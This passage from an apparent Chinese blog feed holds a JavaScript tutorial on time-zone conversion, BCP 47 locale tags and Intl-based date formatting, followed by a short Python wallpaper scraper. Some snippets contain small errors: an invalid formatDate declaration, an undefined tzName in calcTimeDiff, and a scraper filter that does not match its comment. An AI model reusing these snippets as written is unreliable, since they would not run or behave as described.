应用中这是不可接受的</li>\n<li>需要持续更新。时区数据一直在变动，需要在时区数据更新时尽快更新应用内的时区数据，这带来了额外的维护成本</li>\n</ul>\n<p>ES6 为我们带来了 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl\" rel=\"noopener\"><code>Intl</code> 命名空间</a>。在这里，JavaScript 运行时提供了不少时间相关的国际化能力。因此，在不使用额外数据的情况下准确处理时区是可能的，但这并不完美：</p>\n<ul>\n<li>各端不统一。浏览器提供的时区数据受浏览器版本、系统版本等可能变化，最新的时区更新可能无法快速反映到所有设备上</li>\n<li>实现复杂。<code>JavaScript</code> 中 <code>Date</code> 对象的不良设计导致实现完善的时区处理并不容易，且 <code>Intl</code> 命名空间下的对象实例化性能开销较大，需要额外优化</li>\n</ul>\n<blockquote><p><code>Intl</code> 命名空间下还有很多实用的国际化相关方法，值得我们另开一篇文章来讲讲了。</p></blockquote>\n<p>在真实开发中，这需要取舍。目前主流的 JavaScript 时间处理库都已转向浏览器内置方法，并在需要时通过 Polyfill 保证跨端一致性。在这篇文章中，我们将尝试在不使用第三方库的情况下实现基本的时间国际化处理。此外，还有一些诸如需要使用 Unix 时间戳才能正确地在各端交换时间等细节需要注意。</p>\n<h1>时区转换</h1>\n<p>JavaScript 中的 <code>Date</code> 并不是不包含时区信息——实际上，<code>Date</code> 对象表示的一定是当前时区。通过尝试：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1970-01-01T00:00:00Z')\r\n// Thu Jan 01 1970 08:00:00 GMT+0800 (中国标准时间)</pre>\n<p>就可以知道，JavaScript 运行时其实知道当前时区，并会在需要的时候将其他时区的时间转换为当前时区的时间。那么，如何将本地时间转换为其他时区的时间呢？从 <code>Date</code> 的角度看，这并不行，因为我们无法设置一个 <code>Date</code> 对象的时区。但我们可以“投机取巧”：将 <code>Date</code> 对象的时间加上/减去对应的时差，尽管 <code>Date</code> 对象仍然认为自己在本地时区，但这样不就可以正确显示了嘛！但我们会碰到上文提到的问题：时区之间的时间差并不固定，在没有额外数据的情况下很难正确计算。</p>\n<p>还好，ES6 基于 <code>Intl</code> 命名空间扩展了 <code>Date.prototype.toLocaleString()</code> 方法，使其可以接受时区参数并按指定时区格式化时间。如果你在搜索引擎中搜索如何使用 JavaScript 转换时区，你大概率会在 StackOverflow 上找到类似这样的答案：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const convertTimeZone = (date, timeZone) =&gt; {\r\n    return new Date(date.toLocaleString('en-US', { timeZone }))\r\n}\r\n\r\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\r\nconvertTimeZone(now, 'Europe/London') // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<p>很好理解，我们使用 <code>en-US</code> 的区域设置要求 JavaScript 运行时以我们指定的时区格式化时间，再将时间字符串重新解析为时间对象。这里的 <code>timeZone</code> 就是诸如 <code>Asia/Shanghai</code> 等的 IANA TZDB 时区名称。这个字符串确实需要自己提供，但这就是我们唯一需要自己准备的数据了！只要提供了时区名称，浏览器就会自动计算正确的时间，无需我们自行计算。</p>\n<blockquote><p>对于时区名称，你可以考虑使用 <a href=\"https://github.com/vvo/tzdb/\" rel=\"noopener\">@vvo/tzdb</a>。这是一个声称为自动更新的 IANA TZDB 的 JSON 导出，并已被数个大型项目使用。你可以从这个包中导出所有时区名称。</p></blockquote>\n<p>这个方法看起来还不错，对吧？但实际上，它有两个问题：</p>\n<ul>\n<li>指定了区域设置和时区的 <code>toLocaleString()</code> 实际上每次调用都会在 JavaScript 运行时中创建新的 <code>Intl.DateTimeFormat</code> 对象（在后文详述），而后者会带来昂贵的性能开销（在 Node 14 中，实例化一次会在 V8 中增加内存使用约 46.3Kb。但这是符合预期的，详见 <a href=\"https://bugs.chromium.org/p/v8/issues/detail?id=6528\" rel=\"noopener\">V8 Issue</a>）。因此，在密集调用的情况下需要考虑计算并缓存时差，并在一定时间后或需要时进行更新</li>\n<li>使用 <code>toLocaleString()</code> 并使用 <code>en-US</code> 区域设置格式化的默认时间格式类似于 <code>10/13/2021, 1:00:00 AM</code>。这可以被大部分浏览器正确解析，<strong>但这是不规范的，不同浏览器有可能产生不同结果。</strong>你也可以自行配置格式（同下文的 <code>Intl.DateTimeFormat</code>），但仍然无法构造出规范的字符串</li>\n</ul>\n<p>因此，更佳的方案是，我们需要建立一个可反复使用的格式化器以避免重复创建 <code>Intl.DateTimeFormat</code> 带来的额外开销，并需要手动构造出符合规范的时间字符串，并将其重新解析为 <code>Date</code> 对象。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const timeZoneConverter = (timeZone) =&gt; {\r\n    // 新建 DateTimeFormat 对象以供对同一目标时区重用\r\n    // 由于时区属性必须在创建 DateTimeFormat 对象时指定，我们只能为同一时区重用格式化器\r\n    const formatter = new Intl.DateTimeFormat('zh-CN', {\r\n        year: 'numeric',\r\n        month: '2-digit',\r\n        day: '2-digit',\r\n        hour: '2-digit',\r\n        minute: '2-digit',\r\n        second: '2-digit',\r\n        hour12: false,\r\n        timeZone\r\n    })\r\n    return {\r\n        // 提供 conver 方法以将提供的 Date 对象转换为指定时区\r\n        convert (date) {\r\n            // zh-CN 的区域设置会返回类似 1970/01/01 00:00:00 的字符串\r\n            // 替换字符即可构造出类似 1970-01-01T00:00:00 的 ISO 8601 标准格式时间字符串并被正确解析\r\n            return new Date(formatter.format(date).replace(/\\//g, '-').replace(' ', 'T').trim())\r\n        }\r\n    }\r\n}\r\n\r\nconst toLondonTime = timeZoneConverter('Europe/London') // 对于同一时区，此对象可重用\r\n\r\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\r\ntoLondonTime.convert(now) // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<blockquote><p>目前 <code>zh-CN</code> 的区域设置会产生类似 <code>1970/01/01 00:00:00</code> 的格式化字符串。这一格式目前跨端一致，但由于规范没有指定时间格式，<strong>这个格式在未来有可能变更。</strong>更好的方案是使用 <code>formatToParts()</code> 方法（在后文详述）获取时间字符串的各部分并手动拼接出标准格式的字符串，但在这个例子中直接 <code>replace</code> 拥有更好的性能。</p></blockquote>\n<p>现在，尝试反复转换时间至同一时区 1000 次，耗时从 <code>toLocaleString()</code> 1.5 秒降低到了 0.04 秒。尽管代码长了点，但这次重写在最好的情况下为我们带来了超过 20 倍的性能提升。</p>\n<p>需要注意的是，虽然这看起来就算最终方案了，但这个方案依然不完美。主要有以下两个问题：</p>\n<ul>\n<li>在需要密集转换为不同时区时，由于无法重用格式化器，性能依然较差且难以进一步优化</li>\n<li>由于 <code>Intl.DateTimeFormat</code> 不支持格式化毫秒，在格式化字符串的过程中毫秒会丢失，导致最终结果可能会与期望结果产生最高 999ms 的误差，需要额外处理。比如需要计算时差时，我们可能需要这么写：\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const calcTimeDiff = (date, converter) =&gt; {\r\n    const secDate = date - date.getMilliseconds() // 去掉毫秒，避免转换前后精度差异\r\n    return converter.convert(new Date(secDate), tzName) - secDate\r\n}\r\n\r\ncalcTimeDiff(new Date(), timeZoneConverter('Europe/London')) // -25200000</pre>\n</li>\n</ul>\n<p>无论如何，在折腾一番后我们还是把时区正确转换了。接下来准备格式化时间字符串了吗？不过在此之前，我们得先来聊聊语言、文字和区域。</p>\n<h1>语言文字区域傻傻分不清</h1>\n<blockquote><p>如何在计算机中表示中文？</p></blockquote>\n<p>“这不简单，”你可能会说，“用 <code>zh</code> 啊。”</p>\n<blockquote><p>那简体中文呢？</p></blockquote>\n<p>“<code>zh-CN</code>。”你或许会说出这个答案。</p>\n<blockquote><p>那用于新加坡的简体中文和用于中国大陆的简体中文该如何区分呢？</p></blockquote>\n<p>嗯……好问题。</p>\n<p>要能正确区分不同的简体中文，我们还得先回到定义上。实际上，“国际化”并不只是语言的翻译而已，国际化包含的是一整套对于各个<strong>区域</strong>的本地化方案。要准确表示一个国际化方案，我们实际至少需要确定三个属性：语言（Language）、文字（Script）和区域（Locale）。</p>\n<ul>\n<li>\n<strong>语言</strong>通常指的是<strong>声音语言</strong>。不同的语言都有一套自己的发音规则，很难互通。如中文和英语都属于语言</li>\n<li>\n<strong>文字</strong>对应的是某个语言的书写方式，同样的语言可能会有多种书写方案。如中文主要有简体和繁体两种书写方案</li>\n<li>\n<strong>区域</strong>指国际化面向的地区，相同的语言和文字，在不同地区也有可能会有不同的使用习惯。如新加坡和中国大陆都使用简体中文，但两地的用词习惯等有些许差异</li>\n</ul>\n<p>只有确定了这三个属性，我们才能正确定义一个国际化方案（或者说<strong>区域设置</strong>）。当然，还有很多其他属性可以更准确的表达某个区域设置，但通常有语言、文字和区域就已经足够了。</p>\n<p>于是，基于 <a href=\"https://tools.ietf.org/rfc/bcp/bcp47.txt\" rel=\"noopener\">BCP 47</a>，我们可以知道：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN = 中文普通话-简体-中国大陆\r\ncmn-Hans-SG = 中文普通话-简体-新加坡\r\ncmn-Hant-TW = 中文普通话-繁体-台湾\r\nyue-Hant-HK = 中文粤语-繁体-香港</pre>\n<p>等等，这都是啥？还有 BCP 47 又是啥？BCP 是 IETF 发布的“最佳当前实践”文档，而 BCP 47 是一些国际化相关的 ISO 和备忘录的集合，也是目前事实上由 HTML 和 ECMAScript 所使用的表达区域设置的标准。BCP 47 定义的区域设置标签实际上比较复杂，但对于大部分简单使用情况，上文示例中的格式已经完全够用了。简单来说，<strong>要表达一个区域设置，我们会使用 <code>语言[-文字][-区域]</code> 的格式，而文字和区域都是可选的。</strong>而对于每个部分的具体代码，BCP 47 也有做具体定义。其中：</p>\n<ul>\n<li>语言使用 ISO 639-1 定义的两位字母代码（如中文为 <code>zh</code>，英文为 <code>en</code>）或 <a href=\"https://iso639-3.sil.org/code_tables/639/data\" rel=\"noopener\">ISO 639-2/3</a> 定义的三位字母代码（如中文普通话为 <code>cmn</code>，英文为 <code>eng</code>），通常小写</li>\n<li>文字使用 <a href=\"https://unicode.org/iso15924/iso15924-codes.html\" rel=\"noopener\">ISO 15924</a> 定义的四位字母代码，通常首字母大写。如简体中文是 <code>Hans</code>，繁体中文是 <code>Hant</code>\n</li>\n<li>区域通常使用 <a href=\"https://www.iso.org/iso-3166-country-codes.html\" rel=\"noopener\">ISO 3166-1</a> 定义的两位字母代码，通常大写，如中国大陆为 <code>CN</code>，英国为 <code>GB</code>\n</li>\n</ul>\n<blockquote><p>ISO 639-1/2/3 的关系实际是：ISO 639-1 是最早制定的规范，使用两位字母表示语言，但语言数量之多并不能只用两位代码表示。因此后来修订了 ISO 639-2 和 3，使用三位字母表示了更多语言。通常 639-1 代码和 ISO-2/3 代码是一对多的关系。如中文 <code>zh</code> 其实是中文普通话 <code>cmn</code> 的宏语言（macrolanguage），同样使用 <code>zh</code> 为宏语言的语言还有 <code>wuu</code>（中文吴语）、<code>hak</code>（中文客家话）、<code>yue</code>（中文粤语）等数十种。<strong>从规范上我们现在应该使用 ISO 639-2/3 代码来替代 ISO 639-1 代码了</strong>，但由于历史阻力和真实需求中分类无需如此细致等原因，<strong>使用 ISO 639-1 指定语言仍然非常常见而且完全可以接受。</strong>此外，特别地，我们在 ISO 639-3 中定义未指明的语言为 <code>und</code>。</p></blockquote>\n<p>因此，对于这一节开头的两个问题，在 BCP 47 中正确答案其实是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">zh = 中文\r\ncmn = 中文普通话\r\n\r\nzh-Hans = 中文-简体\r\ncmn-Hans = 中文普通话-简体</pre>\n<p>而 <code>zh-CN</code> 实际是指在中国大陆使用的中文，当然也包含在中国大陆使用的繁体中文。<strong>不过，由于大部分情况下一个区域只会通用一种文字，很多情况下我们可以忽略文字这一项</strong>，即使用 <code>zh-CN</code>（或者 <code>cmn-CN</code>）来表示中国大陆的简体中文普通话——毕竟在大部分业务中在中国大陆使用繁体和非普通话的情况非常少。</p>\n<blockquote><p>事实上，类似 <code>zh-Hans</code> 和 <code>zh-Hant</code> 开头的区域设置名称已经被标记为 <code>redundant 废弃</code>，因此尽可能只使用 <code>zh-CN</code> 或者 <code>cmn-Hans-CN</code> 这样的区域设置名称。所有区域设置名称的列表可以在 <a href=\"https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry\" rel=\"noopener\">IANA</a> 找到。</p></blockquote>\n<p>现在我们可以准确定义一个区域设置了。不过我们还有一些小小的需求。比如我们想在 <code>cmn-Hans-CN</code> 的区域设置中使用农历来表示日期，但显然我们上文定义的表示方法并不能表达这一需求。好在，Unicode 为 BCP 47 提供了 u 扩展。在区域设置名称后面加上 <code>-u-[选项]</code> 就可以表达更细致的变体了。所以我们有：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN-u-ca-chinese = 中文普通话-简体-中国大陆-u-日历-中国农历\r\njpn-Jpan-JP-u-ca-japanese = 日语-日文汉字/平假名/片假名-日本-u-日历-日本日历\r\ncmn-Hans-CN-u-nu-hansfin = 中文普通话-简体-中国大陆-u-数字-简体大写数字</pre>\n<p>u 扩展的具体可选项可以在 <a href=\"https://www.unicode.org/reports/tr35/tr35-21.html#Unicode_locale_identifier\" rel=\"noopener\">Unicode 网站</a>上找到。而多个 u 扩展还可以连接——于是我们甚至可以写出 <code>cmn-Hans-CN-u-ca-chinese-nu-hansfin</code> 这种丧心病狂的区域设置名称。当然，相信你现在已经可以看懂这个区域设置的意思了。</p>\n<blockquote><p>不同地区可能会有不同的日历使用习惯，如中国有使用农历的需求，泰国有使用佛历的需求，我们可以通过 u 扩展指定不同的日历。不过，大部分情况下我们会使用标准的 ISO 8601 日历（gregory），JavaScript 的 <code>Date</code> 对象也只支持这种日历。</p></blockquote>\n<blockquote><p>你可以使用 <a href=\"https://r12a.github.io/app-subtags/\" rel=\"noopener\">BCP47 language subtag lookup</a> 工具快速检查你编写的 BCP 47 区域标签是否规范。</p></blockquote>\n<p>终于我们可以正确表达一个完美符合我们需求的区域设置了。接下来，让我们开始格式化时间吧。</p>\n<h1>格式化时间</h1>\n<p>这题我会！</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const formatDate(date) =&gt; {\r\n    return `${date.getFullYear()}-${`${date.getMonth() + 1}`.padStart(2, '0')}-${`${date.getDate()}`.padStart(2, '0')} ${`${date.getHours()}`.padStart(2, '0')}:${`${date.getMinutes()}`.padStart(2, '0')}:${`${date.getSeconds()}`.padStart(2, '0')}`\r\n}\r\n\r\nformatDate(new Date()) // 2021-10-13 01:00:00</pre>\n<p>就完事了……吗？先不论这样的格式化代码难以阅读，尽管上文这样的日期格式国际通用，<strong>但并非所有区域都习惯于这样的日期表示方法。</strong>比如英语国家/地区在很多时候习惯在日期中加入星期，而阿拉伯语国家/地区在部分情况下习惯使用阿拉伯语数字（而非常用的阿拉伯-印度数字）；再比如美式英语国家/地区习惯月-日-年的日期表示法，而英式英语国家/地区习惯日-月-年的日期表示法……不同区域在时间表示格式习惯上的差异是巨大的，<strong>我们很难通过一个简单的方法来正确地、国际化地格式化一个日期。</strong></p>\n<p>好在 ES6 早就为我们铺平了道路。还记得上文提到过的 <code>Intl.DateTimeFormat</code> 吗？我们通过它来实例化一个日期格式化器并用进行日期的国际化。</p>\n<p>直接来看例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const options = {\r\n    year: 'numeric',\r\n    month: 'short',\r\n    day: 'numeric',\r\n    weekday: 'long'\r\n}\r\nconst now = new Date()\r\n\r\nconst enUSFormatter = new Intl.DateTimeFormat('en-US', options)\r\n\r\nconst zhCNFormatter = new Intl.DateTimeFormat('zh-CN', options)\r\nconst zhCNAltFormatter = new Intl.DateTimeFormat('zh-CN-u-ca-chinese', options)\r\nconst zhCNAlt2Formatter = new Intl.DateTimeFormat('zh-CN-u-ca-roc-nu-hansfin', options)\r\n\r\nconst jaFormatter = new Intl.DateTimeFormat('ja', options)\r\nconst jaAltFormatter = new Intl.DateTimeFormat('ja-JP-u-ca-japanese', options)\r\n\r\nconst arEGFormatter = new Intl.DateTimeFormat('ar-EG', options)\r\n\r\nenUSFormatter.format(now) // Wednesday, Oct 13, 2021\r\n\r\nzhCNFormatter.format(now) // 2021年10月13日星期三\r\nzhCNAltFormatter.format(now) // 2021辛丑年九月8星期三\r\nzhCNAlt2Formatter.format(now) // 民国壹佰壹拾年拾月拾叁日星期三\r\n\r\njaFormatter.format(now) // 2021年10月13日水曜日\r\njaAltFormatter.format(now) // 令和3年10月13日水曜日\r\n\r\narEGFormatter.format(now) // الأربعاء، ١٣ أكتوبر ٢٠٢١</pre>\n<blockquote><p>在这里我们使用 ISO 639-1 代码来表示语言，是由于事实上 ISO 639-1 代码更加常见与通用。在大部分支持 <code>Intl.DateTimeFormat</code> 的 JavaScript 运行时中我们也可以使用 ISO 639-2/3 代码来表示语言（但实际会 fallback 至对应的 ISO 639-1 代码）。</p></blockquote>\n<blockquote><p>你也可以通过在 <code>options</code> 中设置 <code>calendar</code> 属性和 <code>numberingSystem</code> 属性来替换区域设置名称中对 u 扩展的使用。这也是推荐方式。</p></blockquote>\n<p>这非常直观，我们可以指定区域设置和格式化选项来初始化一个格式化器，并在之后使用格式化器对象的 <code>format</code> 方法来格式化一个 <code>Date</code> 对象。这里的格式化选项其实非常灵活，能格式化的不只是日期，时间也可以被灵活地格式化，有非常多的组合可以选择。我们不会在这里详细解释每一个选项，你可以访问 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat\" rel=\"noopener\">MDN 文档</a>来了解更多。</p>\n<blockquote><p>如前文所述，<code>Intl.DateTimeFormat</code> 无法格式化毫秒。</p></blockquote>\n<p>不过需要注意的是，<strong>JavaScript 运行时不一定支持所有区域设置，也不一定支持所有格式化选项。</strong>在遇到不支持的情况时，<code>Intl.DateTimeFormat</code> 默认会静默 fallback 到最匹配的支持项，因此在处理不常见的区域设置或选项时，你可能需要再额外检查。你可以通过 <code>Intl.DateTimeFormat.supportedLocalesOf()</code> 静态方法判断当前运行时是否支持指定的区域设置，也可以在实例化格式化器后在对象上调用 <code>resolvedOptions()</code> 方法来检查运行时的解析结果是否与预期一致。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('yue-Hant-CN').resolvedOptions()\r\n// {locale: 'zh-CN', calendar: 'gregory', …}\r\n// fallback 至 zh-CN，与 yue-CN 的预期不一致</pre>\n<p>此外，正如你所看到的，各种语言在日期格式化中使用的文本 JavaScript 运行时都已经帮我们内置了。因此，我们甚至可以利用这些国际化特性来为我们的应用减少一点需要翻译的字符串——打包进应用的翻译越少，应用体积也就越小了嘛——比如说获取一周七天对应的名字：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getWeekdayNames = (locale) =&gt; {\r\n     // 基于一个固定日期计算，这里选择 1970.1.1\r\n     // 不能使用 0，因为 Unix 时间戳 0 在不同时区的日期不一样\r\n    const base = new Date(1970, 0, 1).getTime()\r\n    const formatter = new Intl.DateTimeFormat(locale, { weekday: 'short' })\r\n    return Array.from({ length: 7 }, (_, day) =&gt; (\r\n        formatter.format(new Date(base + 3600000 * 24 * (-4 + day))) // 1970.1.1 是周四\r\n    ))\r\n}\r\n\r\ngetWeekdayNames('en-US') // ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']\r\ngetWeekdayNames('zh-CN') // ['周日', '周一', '周二', '周三', '周四', '周五', '周六']\r\ngetWeekdayNames('ja') // ['日', '月', '火', '水', '木', '金', '土']\r\ngetWeekdayNames('ar-EG') // ['الأحد', 'الاثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت']</pre>\n<p>当然，如果你还是不喜欢运行时为你提供的格式，我们还有上文提到过的 <code>formatToParts()</code> 方法可以用。来看一个简单的例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('zh-CN', {\r\n    year: 'numeric',\r\n    month: 'short',\r\n    day: 'numeric',\r\n    weekday: 'long',\r\n    hour: 'numeric',\r\n    minute: 'numeric',\r\n    second: 'numeric',\r\n}).formatToParts(new Date())\r\n// [\r\n//     { type: 'year', value: '2021' },\r\n//     { type: 'literal', value: '年' },\r\n//     { type: 'month', value: '10' },\r\n//     { type: 'literal', value: '月' },\r\n//     { type: 'day', value: '13' },\r\n//     { type: 'literal', value: '日' },\r\n//     { type: 'weekday', value: '星期三' },\r\n//     { type: 'literal', value: ' ' },\r\n//     { type: 'dayPeriod', value: '上午' },\r\n//     { type: 'hour', value: '1' },\r\n//     { type: 'literal', value: ':' },\r\n//     { type: 'minute', value: '00' },\r\n//     { type: 'literal', value: ':' },\r\n//     { type: 'second', value: '00' }\r\n// ]</pre>\n<p>随后，你就可以自己解析这个数组来构造出你想要的时间格式了。最后，我们还可以使用 <code>Intl.RelativeTimeFormat</code> 来格式化相对日期。当然我们不会在这里详细讲解这个 API，你可以参考 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/RelativeTimeFormat\" rel=\"noopener\">MDN 文档</a>。直接来看一个简单例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getRelativeTime = (num, unit, locale) =&gt; {\r\n    return new Intl.RelativeTimeFormat(locale, { numeric: 'auto' }).format(num, unit)\r\n}\r\n\r\ngetRelativeTime(-3, 'day', 'en-US') // 3 days ago\r\ngetRelativeTime(-1, 'day', 'zh-CN') // 昨天\r\ngetRelativeTime(0, 'second', 'zh-CN') // 现在\r\ngetRelativeTime(3, 'hour', 'ja') // 3 時間後</pre>\n<blockquote><p><code>Intl.RelativeTimeFormat</code> 是一个相对较晚进入标准的对象，因此浏览器支持程度较差，可能需要使用 <a href=\"https://formatjs.io/docs/polyfills/intl-relativetimeformat\" rel=\"noopener\">Polyfill</a>。不过目前（2021.10）主流浏览器的最新版本均已支持此 API。</p></blockquote>\n<h1>未来</h1>\n<p>我希望这篇文章时区转换的部分可以很快过时——这并非无稽之谈，目前（2021.10）TC39 的 <a href=\"https://github.com/tc39/proposal-temporal\" rel=\"noopener\"><code>Temporal</code> 提案</a>已经进入 Stage 3 了。<strong><code>Temporal</code> 提案定义了一个新的、时区友好的 <code>Temporal</code> 命名空间，并期望在不久后就能进入标准并最终应用于生产环境。</strong><code>Temporal</code> 定义了完整的时区、时间段、日历规则的处理，且拥有简单明了的 API。那时候，JavaScript 的时区处理就不会再如此痛苦了。由于目前 <code>Temporal</code> 提案还未进入标准，API 暂未稳定，我们无法将其用于生产环境，但我们可以来看一个简单的例子感受一下这个 API 的强大。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const zonedDateTime = Temporal.ZonedDateTime.from({\r\n  timeZone: 'America/Los_Angeles',\r\n  year: 1995,\r\n  month: 12,\r\n  day: 7,\r\n  hour: 3,\r\n  minute: 24,\r\n  second: 30,\r\n  millisecond: 0,\r\n  microsecond: 3,\r\n  nanosecond: 500,\r\n  calendar: 'iso8601'\r\n}) // 1995-12-07T03:24:30.0000035-08:00[America/Los_Angeles]</pre>\n<p>如果你希望立刻开始使用 <code>Temporal</code>，现在已有 Polyfill 可用。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"js-temporal\" data-mdxgithubp=\"temporal-polyfill\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/js-temporal/temporal-polyfill\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>不过，时区问题不会消失，各地区的习惯也很难融合到一起。时间的国际化处理是<a href=\"https://yourcalendricalfallacyis.com/\" rel=\"noopener\">极其复杂</a>的，前端中的时间国际化仍然值得我们认真关注。</p>\n","link":"https://flyhigher.top/develop/2482.html"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a 